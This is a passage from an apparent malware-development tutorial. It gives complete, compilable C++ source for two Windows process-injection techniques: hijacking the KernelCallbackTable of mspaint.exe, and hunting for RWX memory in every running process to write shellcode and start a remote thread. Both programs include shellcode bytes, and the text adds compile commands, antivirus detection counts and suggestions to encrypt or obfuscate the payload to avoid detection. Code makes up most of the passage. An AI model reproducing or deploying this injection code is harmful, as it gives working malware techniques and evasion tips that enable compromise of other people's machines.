+myNtQueryInformationProcess(ph,
+ProcessBasicInformation,
+&amp;pbi, sizeof(pbi), NULL);
+ReadProcessMemory(ph, pbi.PebBaseAddress,
+&amp;peb, sizeof(peb), NULL);
+ReadProcessMemory(ph, peb.KernelCallbackTable,
+&amp;kct, sizeof(kct), NULL);
+Then, write our payload to remote process via VirtualAllocEx and WriteProcessMemory:
+
+LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
+MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(ph, rb, my_payload,
+sizeof(my_payload), NULL);
+We use VirtualAllocEx which is allows to you to allocate memory buffer for remote
+process, then, WriteProcessMemory allows you to copy data between processes, so
+copy our payload to mspaint.exe process.
+Write the new table to remote process:
+LPVOID tb = VirtualAllocEx(ph, NULL, sizeof(kct),
+MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+kct.__fnCOPYDATA = (ULONG_PTR)rb;
+WriteProcessMemory(ph, tb, &amp;kct, sizeof(kct), NULL);
+Update the PEB:
+WriteProcessMemory(ph,
+(PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
+&amp;tb, sizeof(ULONG_PTR), NULL);
+Trigger execution of payload:
+cds.dwData = 1;
+cds.cbData = lstrlen((LPCSTR)msg) * 2;
+cds.lpData = msg;
+SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&amp;cds);
+Finally, restore original KernelCallbackTable:
+WriteProcessMemory(ph,
+(PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
+&amp;peb.KernelCallbackTable,
+sizeof(ULONG_PTR), NULL);
+SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&amp;cds);
+Here, to restore the original code and check if it restores normally, we called
+SendMessage() again to verify that the code is not running.
+So, full C++ code of our simple malware is:
+/*
+* hack.cpp - process injection via
+* KernelCallbackTable. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/tutorial/
+2022/01/24/malware-injection-15.html
+*/
+#include &lt;./ntddk.h&gt;
+#include &lt;cstdio&gt;
+
+#include &lt;cstddef&gt;
+#pragma comment(lib, "ntdll");
+typedef struct _KERNELCALLBACKTABLE_T {
+ULONG_PTR __fnCOPYDATA;
+ULONG_PTR __fnCOPYGLOBALDATA;
+ULONG_PTR __fnDWORD;
+ULONG_PTR __fnNCDESTROY;
+ULONG_PTR __fnDWORDOPTINLPMSG;
+ULONG_PTR __fnINOUTDRAG;
+ULONG_PTR __fnGETTEXTLENGTHS;
+ULONG_PTR __fnINCNTOUTSTRING;
+ULONG_PTR __fnPOUTLPINT;
+ULONG_PTR __fnINLPCOMPAREITEMSTRUCT;
+ULONG_PTR __fnINLPCREATESTRUCT;
+ULONG_PTR __fnINLPDELETEITEMSTRUCT;
+ULONG_PTR __fnINLPDRAWITEMSTRUCT;
+ULONG_PTR __fnPOPTINLPUINT;
+ULONG_PTR __fnPOPTINLPUINT2;
+ULONG_PTR __fnINLPMDICREATESTRUCT;
+ULONG_PTR __fnINOUTLPMEASUREITEMSTRUCT;
+ULONG_PTR __fnINLPWINDOWPOS;
+ULONG_PTR __fnINOUTLPPOINT5;
+ULONG_PTR __fnINOUTLPSCROLLINFO;
+ULONG_PTR __fnINOUTLPRECT;
+ULONG_PTR __fnINOUTNCCALCSIZE;
+ULONG_PTR __fnINOUTLPPOINT5_;
+ULONG_PTR __fnINPAINTCLIPBRD;
+ULONG_PTR __fnINSIZECLIPBRD;
+ULONG_PTR __fnINDESTROYCLIPBRD;
+ULONG_PTR __fnINSTRING;
+ULONG_PTR __fnINSTRINGNULL;
+ULONG_PTR __fnINDEVICECHANGE;
+ULONG_PTR __fnPOWERBROADCAST;
+ULONG_PTR __fnINLPUAHDRAWMENU;
+ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD;
+ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD_;
+ULONG_PTR __fnOUTDWORDINDWORD;
+ULONG_PTR __fnOUTLPRECT;
+ULONG_PTR __fnOUTSTRING;
+ULONG_PTR __fnPOPTINLPUINT3;
+ULONG_PTR __fnPOUTLPINT2;
+ULONG_PTR __fnSENTDDEMSG;
+ULONG_PTR __fnINOUTSTYLECHANGE;
+ULONG_PTR __fnHkINDWORD;
+
+ULONG_PTR __fnHkINLPCBTACTIVATESTRUCT;
+ULONG_PTR __fnHkINLPCBTCREATESTRUCT;
+ULONG_PTR __fnHkINLPDEBUGHOOKSTRUCT;
+ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX;
+ULONG_PTR __fnHkINLPKBDLLHOOKSTRUCT;
+ULONG_PTR __fnHkINLPMSLLHOOKSTRUCT;
+ULONG_PTR __fnHkINLPMSG;
+ULONG_PTR __fnHkINLPRECT;
+ULONG_PTR __fnHkOPTINLPEVENTMSG;
+ULONG_PTR __xxxClientCallDelegateThread;
+ULONG_PTR __ClientCallDummyCallback;
+ULONG_PTR __fnKEYBOARDCORRECTIONCALLOUT;
+ULONG_PTR __fnOUTLPCOMBOBOXINFO;
+ULONG_PTR __fnINLPCOMPAREITEMSTRUCT2;
+ULONG_PTR __xxxClientCallDevCallbackCapture;
+ULONG_PTR __xxxClientCallDitThread;
+ULONG_PTR __xxxClientEnableMMCSS;
+ULONG_PTR __xxxClientUpdateDpi;
+ULONG_PTR __xxxClientExpandStringW;
+ULONG_PTR __ClientCopyDDEIn1;
+ULONG_PTR __ClientCopyDDEIn2;
+ULONG_PTR __ClientCopyDDEOut1;
+ULONG_PTR __ClientCopyDDEOut2;
+ULONG_PTR __ClientCopyImage;
+ULONG_PTR __ClientEventCallback;
+ULONG_PTR __ClientFindMnemChar;
+ULONG_PTR __ClientFreeDDEHandle;
+ULONG_PTR __ClientFreeLibrary;
+ULONG_PTR __ClientGetCharsetInfo;
+ULONG_PTR __ClientGetDDEFlags;
+ULONG_PTR __ClientGetDDEHookData;
+ULONG_PTR __ClientGetListboxString;
+ULONG_PTR __ClientGetMessageMPH;
+ULONG_PTR __ClientLoadImage;
+ULONG_PTR __ClientLoadLibrary;
+ULONG_PTR __ClientLoadMenu;
+ULONG_PTR __ClientLoadLocalT1Fonts;
+ULONG_PTR __ClientPSMTextOut;
+ULONG_PTR __ClientLpkDrawTextEx;
+ULONG_PTR __ClientExtTextOutW;
+ULONG_PTR __ClientGetTextExtentPointW;
+ULONG_PTR __ClientCharToWchar;
+ULONG_PTR __ClientAddFontResourceW;
+ULONG_PTR __ClientThreadSetup;
+ULONG_PTR __ClientDeliverUserApc;
+ULONG_PTR __ClientNoMemoryPopup;
+
+ULONG_PTR __ClientMonitorEnumProc;
+ULONG_PTR __ClientCallWinEventProc;
+ULONG_PTR __ClientWaitMessageExMPH;
+ULONG_PTR __ClientWOWGetProcModule;
+ULONG_PTR __ClientWOWTask16SchedNotify;
+ULONG_PTR __ClientImmLoadLayout;
+ULONG_PTR __ClientImmProcessKey;
+ULONG_PTR __fnIMECONTROL;
+ULONG_PTR __fnINWPARAMDBCSCHAR;
+ULONG_PTR __fnGETTEXTLENGTHS2;
+ULONG_PTR __fnINLPKDRAWSWITCHWND;
+ULONG_PTR __ClientLoadStringW;
+ULONG_PTR __ClientLoadOLE;
+ULONG_PTR __ClientRegisterDragDrop;
+ULONG_PTR __ClientRevokeDragDrop;
+ULONG_PTR __fnINOUTMENUGETOBJECT;
+ULONG_PTR __ClientPrinterThunk;
+ULONG_PTR __fnOUTLPCOMBOBOXINFO2;
+ULONG_PTR __fnOUTLPSCROLLBARINFO;
+ULONG_PTR __fnINLPUAHDRAWMENU2;
+ULONG_PTR __fnINLPUAHDRAWMENUITEM;
+ULONG_PTR __fnINLPUAHDRAWMENU3;
+ULONG_PTR __fnINOUTLPUAHMEASUREMENUITEM;
+ULONG_PTR __fnINLPUAHDRAWMENU4;
+ULONG_PTR __fnOUTLPTITLEBARINFOEX;
+ULONG_PTR __fnTOUCH;
+ULONG_PTR __fnGESTURE;
+ULONG_PTR __fnPOPTINLPUINT4;
+ULONG_PTR __fnPOPTINLPUINT5;
+ULONG_PTR __xxxClientCallDefaultInputHandler;
+ULONG_PTR __fnEMPTY;
+ULONG_PTR __ClientRimDevCallback;
+ULONG_PTR __xxxClientCallMinTouchHitTestingCallback;
+ULONG_PTR __ClientCallLocalMouseHooks;
+ULONG_PTR __xxxClientBroadcastThemeChange;
+ULONG_PTR __xxxClientCallDevCallbackSimple;
+ULONG_PTR __xxxClientAllocWindowClassExtraBytes;
+ULONG_PTR __xxxClientFreeWindowClassExtraBytes;
+ULONG_PTR __fnGETWINDOWDATA;
+ULONG_PTR __fnINOUTSTYLECHANGE2;
+ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX2;
+} KERNELCALLBACKTABLE;
+// NtQueryInformationProcess
+typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
+IN HANDLE ProcessHandle,
+
+IN PROCESSINFOCLASS ProcessInformationClass,
+OUT PVOID ProcessInformation,
+IN ULONG ProcessInformationLength,
+OUT PULONG ReturnLength OPTIONAL
+);
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main() {
+HANDLE ph;
+DWORD pid;
+PROCESS_BASIC_INFORMATION pbi;
+KERNELCALLBACKTABLE kct;
+COPYDATASTRUCT cds;
+PEB peb;
+WCHAR msg[] = L"kernelcallbacktable injection impl";
+// find a window for mspaint.exe
+HWND hw = FindWindow(NULL, (LPCSTR) "Untitled - Paint");
+if (hw == NULL) {
+
+printf("failed to find window :(\n");
+return -2;
+}
+GetWindowThreadProcessId(hw, &amp;pid);
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+HMODULE ntdll = GetModuleHandleA("ntdll");
+pNtQueryInformationProcess myNtQueryInformationProcess =
+(pNtQueryInformationProcess)(GetProcAddress(
+ntdll, "NtQueryInformationProcess"));
+myNtQueryInformationProcess(ph,
+ProcessBasicInformation, &amp;pbi, sizeof(pbi), NULL);
+ReadProcessMemory(ph, pbi.PebBaseAddress,
+&amp;peb, sizeof(peb), NULL);
+ReadProcessMemory(ph, peb.KernelCallbackTable,
+&amp;kct, sizeof(kct), NULL);
+LPVOID rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
+MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(ph, rb, my_payload,
+sizeof(my_payload), NULL);
+LPVOID tb = VirtualAllocEx(ph, NULL, sizeof(kct),
+MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+kct.__fnCOPYDATA = (ULONG_PTR)rb;
+WriteProcessMemory(ph, tb, &amp;kct, sizeof(kct), NULL);
+WriteProcessMemory(ph,
+(PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
+&amp;tb, sizeof(ULONG_PTR), NULL);
+cds.dwData = 1;
+cds.cbData = lstrlen((LPCSTR)msg) * 2;
+cds.lpData = msg;
+SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&amp;cds);
+WriteProcessMemory(ph,
+(PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable),
+&amp;peb.KernelCallbackTable, sizeof(ULONG_PTR), NULL);
+VirtualFreeEx(ph, rb, 0, MEM_RELEASE);
+VirtualFreeEx(ph, tb, 0, MEM_RELEASE);
+CloseHandle(ph);
+
+return 0;
+}
+As usually, for simplicity, I used meow-meow messagebox payload:
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our example: x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ \ -I/home/.../cybersec_blog/2022-01-24-malware-injection-15/ \ -s -ffunction-sections -fdata-sections \ -Wno-write-strings -fno-exceptions -fmerge-all-constants \ -static-libstdc++ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then run it! In our case victim machine is Windows 10 x64:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">We can see that everything was completed perfectly :) An interesing observation: when I close meow messagebox window, my</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">mspaint.exe is crashed and recovered:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Moneta64.exe result:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, upload our malware to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/5fcd9b3c453c7e2ac9dcc48f358b3e7851ac18edf1 3fb1658e29f90ffa2c5a74/detection So, 7 of 67 AV engines detect our file as malicious. I think this is due to the fact that the combination of <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code> and <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code> functions is very suspicious and well known to AV engines and malware analysts from blue teams. If we want, for better result, we can add payload encryption with key or obfuscate functions, or combine both of this techniques. I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. ntddk.h header NtQueryInformationProcess FindWindow <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">ReadProcessMemory</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code> SendMessage Moneta64.exe source code in Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">28. process injection via <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">RWX</code>-memory hunting. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is a self-researching of another process injection technique. <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">RWX</code>-memory hunting Let’s take a look at logic of our classic code injection malware:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">//...
+// allocate memory buffer for remote process
+rb = VirtualAllocEx(ph, NULL, my_payload_len,
+(MEM_RESERVE | MEM_COMMIT),
+PAGE_EXECUTE_READWRITE);
+// "copy" data between processes
+WriteProcessMemory(ph, rb, my_payload,
+sizeof(my_payload), NULL);
+// our process start new thread
+rt = CreateRemoteThread(ph, NULL, 0,
+(LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
+//...
+As you remember, we use VirtualAllocEx which is allows to us to allocate memory
+buffer for remote process, then, WriteProcessMemory allows you to copy data between
+processes. And CreateRemoteThread you can specify which process should start the
+new thread.
+What about another way? it is possible to enumerate currently running target processes
+on the compromised system - search through their allocated memory blocks and check
+
+if any those are protected with RWX, so we can attempt to write/read/execute them,
+which may help to evasion some AV/EDR.
+practical example</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The flow is this technique is simple, let’s go to investigate its logic: Loop through all the processes on the system:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Loop through all allocated memory blocks in each process:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, we check for memory block that is protected with <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">RWX</code>:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">if ok, print our memory block (* for demonstration *):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">write our payload to this memory block:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">then start a new remote thread:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Full C++ source code of our malware is:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+process injection technique via
+RWX memory hunting
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/02/01/malware-injection-16.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tlhelp32.h&gt;
+
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main(int argc, char* argv[]) {
+MEMORY_BASIC_INFORMATION m;
+PROCESSENTRY32 pe;
+LPVOID address = 0;
+HANDLE ph;
+HANDLE hSnapshot;
+BOOL hResult;
+pe.dwSize = sizeof(PROCESSENTRY32);
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hSnapshot) return -1;
+hResult = Process32First(hSnapshot, &amp;pe);
+while (hResult) {
+ph = OpenProcess(MAXIMUM_ALLOWED, false, pe.th32ProcessID);
+if (ph) {
+printf("hunting in %s\n", pe.szExeFile);
+while (VirtualQueryEx(ph, address, &amp;m, sizeof(m))) {
+
+address = (LPVOID)(
+(DWORD_PTR)m.BaseAddress + m.RegionSize);
+if (m.AllocationProtect == PAGE_EXECUTE_READWRITE) {
+printf("rwx memory successfully found at 0x%x :)\n",
+m.BaseAddress);
+WriteProcessMemory(ph, m.BaseAddress,
+my_payload, sizeof(my_payload), NULL);
+CreateRemoteThread(ph, NULL, NULL,
+(LPTHREAD_START_ROUTINE)m.BaseAddress,
+NULL, NULL, NULL);
+break;
+}
+}
+address = 0;
+}
+hResult = Process32Next(hSnapshot, &amp;pe);
+}
+CloseHandle(hSnapshot);
+CloseHandle(ph);
+return 0;
+}
+As usually, for simplicity I used meow-meow messagebox payload:
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our practical example: x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -Wint-to-pointer-cast \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then run it! In our case victim machine is Windows 10 x64:</p>
